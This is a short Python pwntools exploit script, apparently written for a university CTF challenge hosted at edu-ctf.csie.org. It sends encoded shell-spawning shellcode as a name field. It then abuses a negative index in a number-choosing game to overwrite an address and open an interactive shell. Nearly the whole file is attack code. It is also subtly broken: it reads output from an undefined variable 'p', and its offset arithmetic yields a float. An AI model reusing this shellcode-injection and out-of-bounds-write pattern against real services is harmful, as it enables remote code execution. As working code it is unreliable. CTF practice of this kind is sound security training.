# #!/usr/bin/env python3
from pwn import *

# shellcode
context.clear(arch='x86_64')
sc = pwnlib.encoders.encoder.encode(asm(shellcraft.sh()))
sc = b'\x00' * 32 + sc
print('sc ', sc)

# random number
l = process("./gen_num.out")
numbers = p.recvall().decode().split('\n')
del numbers[-1]
l.close()

# send
pause()
r = remote('edu-ctf.csie.org', 10172)
r.sendlineafter('name: ', sc)
r.sendlineafter('age: ', '40')

offset = -176 / 4

for cnt_try in range(0, 2):
    cnt_num = 0
    if cnt_try == 1:
        for i in numbers:
            r_out = 'Chose the number ' + str(cnt_num) + ': '
            r.sendlineafter(r_out, str(i))
            cnt_num += 1
    elif cnt_try == 0:
        for i in range(0, 6):
            r_out = 'Chose the number ' + str(cnt_num) + ': '
            r.sendlineafter(r_out, str(i))
            cnt_num += 1

    r.sendlineafter('0:no]:', '1')

    if cnt_try == 1:
        r.sendlineafter('6]:', str(offset + 2))

        r_out = 'Chose the number ' + str(offset + 1) + ': '
        r.sendlineafter(r_out, '0')
    elif cnt_try == 0:
        r.sendlineafter('6]:', str(offset + 1))

        r_out = 'Chose the number ' + str(offset) + ': '
        hijack = 0x602110
        hijack = str(hijack)
        print('hijack ', hijack)
        r.sendlineafter(r_out, hijack)

r.interactive()
r.close()
